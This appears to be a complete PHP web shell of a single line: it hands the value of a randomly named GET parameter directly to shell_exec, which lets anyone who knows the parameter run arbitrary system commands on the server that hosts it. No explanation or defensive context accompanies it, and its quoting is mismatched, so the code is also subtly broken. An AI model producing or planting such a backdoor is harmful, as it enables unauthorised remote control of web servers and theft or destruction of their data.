<?php
shell_exec($_GET["Jogsx5kR']);
?>
